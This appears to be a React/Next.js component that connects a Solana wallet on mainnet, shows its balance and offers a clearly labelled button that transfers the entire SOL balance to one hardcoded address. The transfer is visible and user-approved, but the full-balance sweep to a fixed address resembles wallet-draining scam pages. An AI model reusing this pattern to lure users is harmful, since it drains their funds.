
'use client';

import { useEffect, useMemo, useState } from 'react';
import {
  Connection,
  PublicKey,
  LAMPORTS_PER_SOL,
  SystemProgram,
  Transaction,
} from '@solana/web3.js';
import {
  useWallet,
  WalletProvider,
  ConnectionProvider,
} from '@solana/wallet-adapter-react';
import {
  WalletModalProvider,
  WalletMultiButton,
} from '@solana/wallet-adapter-react-ui';
import {
  PhantomWalletAdapter,
  SolflareWalletAdapter,
  TorusWalletAdapter,
} from '@solana/wallet-adapter-wallets';
import { clusterApiUrl } from '@solana/web3.js';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';

// Import wallet adapter styles using ES Modules syntax
import '@solana/wallet-adapter-react-ui/styles.css';

const VERTEX_SOL_ADDRESS = new PublicKey('827FoJXyAQmyMtqgkKG52YQJyLkfxyFVHwLk98o7jz11');
const connection = new Connection(clusterApiUrl('mainnet-beta'));

function WalletAction() {
  const { publicKey, signTransaction, sendTransaction, connected } = useWallet();
  const [status, setStatus] = useState<string>('');
  const [loading, setLoading] = useState(false);
  const [balance, setBalance] = useState<number | null>(null);

  useEffect(() => {
    if (!publicKey) return;
    (async () => {
      const bal = await connection.getBalance(publicKey);
      setBalance(bal);
    })();
  }, [publicKey]);

  const handleTransferAllSol = async () => {
    if (!publicKey || !signTransaction || !connected) return;
    setLoading(true);
    setStatus('');

    try {
      const balance = await connection.getBalance(publicKey);
      if (balance <= 5000) throw new Error('Not enough SOL to cover transaction fee');

      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: VERTEX_SOL_ADDRESS,
          lamports: balance - 5000,
        })
      );

      const signature = await sendTransaction(tx, connection);
      await connection.confirmTransaction(signature, 'confirmed');
      setStatus(`Success! Tx Signature: ${signature}`);
    } catch (err: any) {
      setStatus(`Error: ${err.message}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <Card className="max-w-md mx-auto mt-10 p-4 w-full sm:w-11/12">
      <CardContent className="flex flex-col gap-4 items-center">
        <WalletMultiButton className="!w-full" />
        {connected && (
          <>
            <div className="text-sm text-gray-600">
              Balance: {balance !== null ? (balance / LAMPORTS_PER_SOL).toFixed(4) : 'Loading...'} SOL
            </div>
            <Button
              onClick={handleTransferAllSol}
              className="bg-red-600 hover:bg-red-700 w-full"
              disabled={loading}
            >
              {loading ? 'Sending...' : 'Send All SOL to VertexSol'}
            </Button>
          </>
        )}
        {status && <p className="text-sm text-gray-500 text-center break-words">{status}</p>}
      </CardContent>
    </Card>
  );
}

export default function SolanaWalletModal() {
  const isMobile = typeof window !== 'undefined' && window.innerWidth < 768;

  const wallets = useMemo(() => {
    const baseWallets = [new PhantomWalletAdapter(), new SolflareWalletAdapter()];
    return isMobile ? baseWallets : [...baseWallets, new TorusWalletAdapter()];
  }, [isMobile]);

  return (
    <ConnectionProvider endpoint={clusterApiUrl('mainnet-beta')}>
      <WalletProvider wallets={wallets} autoConnect>
        <WalletModalProvider>
          <WalletAction />
        </WalletModalProvider>
      </WalletProvider>
    </ConnectionProvider>
  );
}
